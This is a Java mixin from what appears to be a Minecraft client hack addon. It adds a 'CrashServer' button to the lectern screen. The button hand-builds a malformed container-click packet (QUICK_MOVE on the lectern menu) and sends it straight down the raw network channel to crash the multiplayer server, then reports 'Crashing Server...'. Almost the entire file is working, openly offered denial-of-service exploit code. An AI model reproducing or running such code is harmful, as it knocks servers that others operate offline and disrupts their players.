package pwn.noobs.trouserstreak.mixin;

import com.google.common.collect.Lists;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import meteordevelopment.meteorclient.systems.modules.Modules;
import net.minecraft.client.gui.components.Button;
import net.minecraft.client.gui.screens.Screen;
import net.minecraft.client.gui.screens.inventory.LecternScreen;
import net.minecraft.core.NonNullList;
import net.minecraft.network.HashedPatchMap;
import net.minecraft.network.HashedStack;
import net.minecraft.network.chat.Component;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.world.inventory.AbstractContainerMenu;
import net.minecraft.world.inventory.ContainerInput;
import net.minecraft.world.inventory.Slot;
import net.minecraft.world.item.ItemStack;
import pwn.noobs.trouserstreak.mixin.accessor.ClientConnectionAccessor;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;
import pwn.noobs.trouserstreak.modules.LecternCrash;

import java.util.List;

@Mixin(LecternScreen.class)
public class LecternScreenMixin extends Screen {
    protected LecternScreenMixin(Component title) {
        super(title);
    }

    @Inject(at = @At("TAIL"), method = "init")
    public void init(CallbackInfo ci) {
        if(Modules.get().isActive(LecternCrash.class)){
        this.addRenderableWidget(new Button.Builder(Component.nullToEmpty("CrashServer"), (button) -> {
            AbstractContainerMenu screenHandler = minecraft.player.containerMenu;
            NonNullList<Slot> defaultedList = screenHandler.slots;
            int i = defaultedList.size();
            List<ItemStack> list = Lists.newArrayListWithCapacity(i);

            for (Slot slot : defaultedList) {
                list.add(slot.getItem().copy());
            }

            Int2ObjectMap<HashedStack> int2ObjectMap = new Int2ObjectOpenHashMap<>();
            HashedPatchMap.HashGenerator hasher = minecraft.getConnection().decoratedHashOpsGenenerator();

            for(int slot = 0; slot < i; ++slot) {
                ItemStack itemStack = list.get(slot);
                ItemStack itemStack2 = (defaultedList.get(slot)).getItem();
                HashedStack hash = HashedStack.create(itemStack2, hasher);
                if (!ItemStack.matches(itemStack, itemStack2)) {
                    int2ObjectMap.put(slot, hash);
                }
            }
            HashedStack hash = HashedStack.create(minecraft.player.containerMenu.getCarried(), hasher);
            ((ClientConnectionAccessor) minecraft.getConnection().getConnection()).getChannel().writeAndFlush(new ServerboundContainerClickPacket(minecraft.player.containerMenu.containerId, minecraft.player.containerMenu.getStateId(), (short) 0, (byte) 0, ContainerInput.QUICK_MOVE, int2ObjectMap, hash));
            minecraft.player.sendSystemMessage(Component.nullToEmpty("Crashing Server..."));
            button.active = false;
        })
                        .pos(5, 25)
                        .size(100, 20)
                        .build()
        );
        }
    }
}
